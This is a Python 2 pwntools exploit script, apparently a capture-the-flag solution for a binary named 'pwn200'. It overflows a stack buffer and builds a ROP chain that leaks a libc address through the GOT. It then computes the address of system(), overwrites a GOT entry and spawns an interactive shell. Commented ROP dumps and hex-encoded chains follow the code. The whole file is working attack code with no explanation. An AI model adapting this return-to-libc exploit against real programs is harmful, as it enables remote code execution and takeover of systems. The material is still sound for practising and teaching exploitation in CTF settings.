#!/usr/bin/env python2
from pwn import *

context.arch = "i386"
io = process("./pwn200")

binary = ELF("pwn200")
libc = ELF("/usr/lib32/libc.so.6")

payload0 = 'syclover\x00\x00123456'+'\xef' # second write len
io.send(payload0)

payload1 = '1' * 0x9c
payload1 += '2345'

rop = ROP(binary)
rop.write(1, binary.got["__libc_start_main"], 4)
rop.read(0, binary.got["__libc_start_main"], 9)
rop.call(binary.plt["__libc_start_main"], (binary.got["__libc_start_main"] + 4,))
payload1 += rop.chain()
print rop.dump()
print rop.chain().encode("hex")

io.send(payload1)

buf = io.readrepeat(timeout=0.2)
lib_main_add = u32(buf[-4:])

system_add = lib_main_add - libc.symbols["__libc_start_main"] + libc.symbols["system"]
print hex(system_add)
payload2 = p32(system_add)
payload2 += 'sh\x00\x00'

io.sendline(payload2)
io.interactive()

#[*] Loaded cached gadgets for 'pwn200'
#0x0000:        0x80483a0 write(1, 134518876, 4)
#0x0004:        0x80485bc <adjust: add byte ptr [eax], al; pop ebx; pop edi; pop ebp; ret >
#0x0008:              0x1 arg0
#0x000c:        0x804985c got.__libc_start_main
#0x0010:              0x4 arg2
#0x0014:        0x8048360 read(0, 134518876, 9)
#0x0018:        0x80485bc <adjust: add byte ptr [eax], al; pop ebx; pop edi; pop ebp; ret >
#0x001c:              0x0 arg0
#0x0020:        0x804985c got.__libc_start_main
#0x0024:              0x9 arg2
#0x0028:        0x8048390 0x8048390(134518880)
#0x002c:           'laaa' <pad>
#0x0030:        0x8049860 got.write
#a0830408bc850408010000005c9804080400000060830408bc850408000000005c98040809000000908304086c61616160980408

#[*] Loaded cached gadgets for 'pwn200'
#0x0000:        0x80483a0 (write)
#0x0004:        0x80485be (pop ebx; pop edi; pop ebp; ret)
#0x0008:              0x1
#0x000c:        0x804985c (got.__libc_start_main)
#0x0010:              0x4
#0x0014:        0x8048360 (read)
#0x0018:        0x80485be (pop ebx; pop edi; pop ebp; ret)
#0x001c:              0x0
#0x0020:        0x804985c (got.__libc_start_main)
#0x0024:              0x9
#0x0028:        0x8048390 (__libc_start_main)
#0x002c:        0x80485e1 (mov ebp, esp; pop ebp; ret)
#0x0030:        0x8049860 (got.write)
#a0830408be850408010000005c9804080400000060830408be850408000000005c9804080900000090830408e185040860980408

